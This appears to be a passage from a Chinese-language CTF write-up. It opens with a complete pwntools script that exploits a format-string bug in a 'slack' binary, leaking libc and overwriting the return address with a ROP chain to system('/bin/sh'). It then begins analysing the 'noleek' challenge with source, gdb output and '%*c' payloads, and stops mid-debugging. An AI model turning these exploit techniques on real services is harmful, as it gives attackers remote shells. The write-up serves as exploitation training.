
```python
from pwn import \*
import warnings
import subprocess
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序
context.log\_level = 'DEBUG'
# context.log\_level = 'CRITICAL'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane\_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./slack")
p = process("./slack")
libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")
# for i in range(0x10):
# p = process("./slack")
# sla(b"): ", f"%{i}$p")
# ru("You: ")
# data = rl().strip()
# print(f"{i=} {data=}")
# p.close()
# step1: leak stack/libc
sla(b"): ", "%1$p %9$p")
ru("You: ")
data = rl().strip().decode().split()
some\_stack\_addr = data[0]
some\_libc\_addr = data[1]
logsucc("some\_stack\_addr = " + some\_stack\_addr)
logsucc("some\_libc\_addr = " + some\_libc\_addr)
main\_ret\_addr = int(some\_stack\_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190)
libc\_base\_addr = int(some\_libc\_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0)
libc.address = libc\_base\_addr
leak("main\_ret\_addr", main\_ret\_addr)
leak("libc\_base\_addr", libc\_base\_addr)
# dbg()
# step2: set i to some negative number
i\_addr = main\_ret\_addr - (0x68+8)
leak("i\_addr", i\_addr)
# dbg()
print(f"%{hex(i\_addr + 3)}") # 变量i最高一个字节的地址
print(f"%{hex((i\_addr + 3) & 0xffff)}") # 变量i最高一个字节的地址的最低2字节
sa(b"): ", f"%{(i\_addr + 3) & 0xffff}c%25$hn") # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址 （此处发送的数据极容易达到13个字节，比如b'%54603c%25$hn'。因此应该用sa，而不要用sla，否则在缓冲区里还存着一个\x00，下一行再次发送数据的时候会导致错误）
sla(b"): ", b"%255c%55$hn") # 将0xff写入到变量i内容的最高1字节
# dbg()
# step3: overwrite return address with rop
rop = ROP(libc)
rop.raw(rop.find\_gadget(["ret"]))
rop.system(next(libc.search(b"/bin/sh")))
chain = rop.chain() # 构造rop链
# print("=======")
# print(rop.dump())
# one\_gadget = libc.address + 0x50A37
# print(f"{hex(one\_gadget)=}")
for i in range(len(rop.chain())):
payload = chain[i]
out = f"%{(main\_ret\_addr + i) & 0xffff}c%25$hn"
print(f"{i=} {out=}")
sa(b"): ", out.encode()) #修改offset=55处的内容为ret地址
if payload == 0:
out = f"%55$hhn"
print(f"{i=} {out=}")
else:
out = f"%{payload}c%55$hhn"
print(f"{i=} {out=}")
sla(b"): ", out) # 一字节一字节地覆写ret
# 下面尝试写了写 直接覆写ret，当然因为输入长度限制的原因，肯定是不能成功的。
# for i in range(len(rop.chain())):
# payload = chain[i]
# # print(payload)
# if payload == 0: # 写入0
# out = f"%22$hnnA".encode() + p64(main\_ret\_addr + i)
# print(f"{i=} {out=}")
# else:
# payload2 = payload - 8
# out = p64(main\_ret\_addr + i) + f"%{payload2}c%21$hnn".encode()
# print(f"{i=} {out=}")
# # out = f"%{payload}c%21$hhn" # 0xf+1+5=21
# sa(b"): ", out)
# dbg()
sa(b"): ", f"%{(i\_addr + 3) & 0xffff}c%25$hn")
sla(b"): ", b"%55$hhn") # 把i改回来，不然会卡在循环里
itr()
# exit(0)
```

![image-20230715191027262](upload/attach/202402/830671_884HM5S5GBSMJHY.jpg)

> 注意`sa` 和 `sla` 的问题，见注释。

# 6 noleek

> My code had a couple of pesky format string vulnerabilities that kept getting exploited...I'm sure it'll fix itself if I just compile with RELRO and take away output...
> 
> 题目说明很清楚，存在格式化字符串漏洞，但是使用 RELRO 进行编译并删除了输出。
> 
> 注意做题环境，这道题的环境是`debian@sha256:98......`，我一开始用`ubuntu22`做题，调试的时候执行到`fprintf`过不去，会崩掉。

Dockerfile如下：

```dockerfile
FROM pwn.red/jail
COPY --from=debian@sha256:98d3b4b0cee264301eb1354e0b549323af2d0633e1c43375d0b25c01826b6790 / /srv
COPY noleek /srv/app/run
COPY flag.txt /srv/app/flag.txt
RUN chmod 755 /srv/app/run
```

## 6.1 运行分析

有源码，先看看源码。如下所示，两次输入，然后输出不再是给`stdout`，而是给了`/dev/null`

```c
#include <stdio.h>
#include <stdlib.h>
#define LEEK 32
void cleanup(int a, int b, int c) {}
int main(void) {
setbuf(stdout, NULL);
FILE* leeks = fopen("/dev/null", "w");
if (leeks == NULL) {
puts("wtf");
return 1;
}
printf("leek? ");
char inp[LEEK];
fgets(inp, LEEK, stdin); // 往长度为32的栈buffer输入数据
fprintf(leeks, inp); // 把输入输出到/dev/null，格式化字符串漏洞
printf("more leek? ");
fgets(inp, LEEK, stdin); // 再次输入
fprintf(leeks, inp); // 格式化字符串漏洞
printf("noleek.\n");
cleanup(0, 0, 0);
return 0;
}
```

`fprintf`函数原型：

```c
//发送格式化输出到流 stream 中
int fprintf(FILE *stream, const char *format, ...)
// 正常使用
fprintf(fp, "%s %s %s %d", "We", "are", "in", 2014);
```

关闭Canary，RELRO是Full RELRO。

```shell
root@429d186baf6b:/chal# ./noleek
leek? aaa
more leek? aaa
noleek.
root@429d186baf6b:/chal#
root@429d186baf6b:/chal# checksec noleek
[*] '/chal/noleek'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
```

这道题没有输出，也就不能泄露地址了。利用思路参考上一题，不过区别是本题利用`%\*c`来修改栈里存储的某个指针的低4字节，为什么是4字节，见下面，使其指向存储`main_ret`的地方。

### 格式化字符串中`\*`的作用

星号在 `printf` 格式化字符串中的作用是用于指定动态宽度或精度。在输出字符串时，星号可以通过传递另一参数 `int` 类型的方式动态定义输出的宽度或精度。测试格式化字符串中 `\*` 的作用：

```c
#include<stdio.h>
void main(){
printf("%\*c", 5, '\*');// 输出一个星号字符 '\*'，并指定宽度为 5
printf("\n");
printf("%.\*f", 2, 3.14159);
printf("\n");
}
```

- 第一个输出结果：在宽度为 5 的位置上输出星号字符
- 第二个输出结果：星号指定了精度为 2，输出结果保留两位小数

```shell
root@429d186baf6b:/chal# ./a.out
\*
3.14
```

## 6.2 调试

`gdb`调试，输入`AAAAAAAA.%p.%p.%p.%p`。

- 存储`main_ret`的地址是`0x7ffc6faf3498`
- `rsi`，也就是`fprintf`第二个参数`inp`的地址是`0x7ffc6faf3460`
- `fprintf`第三个参数`vararg`的值和`rsi`一致，也是`0x7ffc6faf3460`

![image-20230716021111567](upload/attach/202402/830671_96RBSYYKVNR9WA9.jpg)

和上一题一样，在栈里找一个存储了栈地址的地方，算出其偏移，`fprintf`格式化字符串参数之后的第几个参数

```shell
pwndbg> stack 30
00:0000│ rdx rsi r8 rsp 0x7ffc6faf3460 ◂— 'AAAAAAAA.%p.%p.%p.%p\n'
01:0008│ 0x7ffc6faf3468 ◂— '.%p.%p.%p.%p\n'
02:0010│ 0x7ffc6faf3470 ◂— 0xa70252e70 /\* 'p.%p\n' \*/
03:0018│ 0x7ffc6faf3478 —▸ 0x55cc237c30a0 (\_start) ◂— xor ebp, ebp
04:0020│ 0x7ffc6faf3480 —▸ 0x7ffc6faf3580 ◂— 0x1
05:0028│ 0x7ffc6faf3488 —▸ 0x55cc242652a0 ◂— 0xfbad2484
06:0030│ rbp 0x7ffc6faf3490 —▸ 0x55cc237c3290 (\_\_libc\_csu\_init) ◂— push r15
07:0038│ 0x7ffc6faf3498 —▸ 0x7f3cd6c26d0a (\_\_libc\_start\_main+234) ◂— mov edi, eax #[1]main\_ret
08:0040│ 0x7ffc6faf34a0 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek' # [2]
09:0048│ 0x7ffc6faf34a8 ◂— 0x100000000
0a:0050│ 0x7ffc6faf34b0 —▸ 0x55cc237c3195 (main) ◂— push rbp
0b:0058│ 0x7ffc6faf34b8 —▸ 0x7f3cd6e0b180 (init\_cacheinfo+287) ◂— mov rbp, rax
0c:0060│ 0x7ffc6faf34c0 ◂— 0x0
0d:0068│ 0x7ffc6faf34c8 ◂— 0x8863beef03c1ee55
0e:0070│ 0x7ffc6faf34d0 —▸ 0x55cc237c30a0 (\_start) ◂— xor ebp, ebp
0f:0078│ 0x7ffc6faf34d8 ◂— 0x0
... ↓ 2 skipped
12:0090│ 0x7ffc6faf34f0 ◂— 0xdc0327490fa1ee55
13:0098│ 0x7ffc6faf34f8 ◂— 0xdd825593bf67ee55
14:00a0│ 0x7ffc6faf3500 ◂— 0x0
... ↓ 2 skipped
17:00b8│ 0x7ffc6faf3518 ◂— 0x1
18:00c0│ 0x7ffc6faf3520 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek' # [3]
19:00c8│ 0x7ffc6faf3528 —▸ 0x7ffc6faf3598 —▸ 0x7ffc6faf4f19 ◂— 'HOSTNAME=cb420c074f1e'
1a:00d0│ 0x7ffc6faf3530 —▸ 0x7f3cd6e0b180 —▸ 0x55cc237c2000 ◂— 0x10102464c457f
1b:00d8│ 0x7ffc6faf3538 ◂— 0x0
1c:00e0│ 0x7ffc6faf3540 ◂— 0x0
1d:00e8│ 0x7ffc6faf3548 —▸ 0x55cc237c30a0 (\_start) ◂— xor ebp, ebp
```

偏移：

- `[2]` `8+1+4=13`
- `[3]` `0x18+1+4=29`
- 加4是因为这里格式化字符串是第二个参数了

如果选`[2]`这个偏移，格式化字符串可以这样写：

```python
%\*c%13$hn
```

在上面调试记录中，`fprintf`第三个参数`vararg`是`0x7ffc6faf3460`，所以`%\*c`对应的整型值是`0x6faf3460`。所以，发送payload后，会将地址`0x7ffc6faf3588`里的内容`0x7ffc6faf4f0c`改成`0x7ffc6faf3460`。

而我们的目的是将地址`0x7ffc6faf3588`里的内容改成存储`main_ret`的地址，因此还需要计算`0x7ffc6faf3460`和`addr(main_ret)`的偏移：

```shell
pwndbg> p/x 0x7ffc6faf3498-0x7ffc6faf3460
$1 = 0x38
```

> 其实这里有个隐含要求，就是`addr(main_ret)`需要大于`vararg`，因为我们只能在`vararg`低4Byte的基础上再加字符，好在题目里是满足的。

修改格式化字符串:

```python
%\*c%56c%13$hn
```

下面调试查看结果：

- `call fprintf`前：

![image-20230716172102163](upload/attach/202402/830671_8DM2BTR6QURRZVN.jpg)
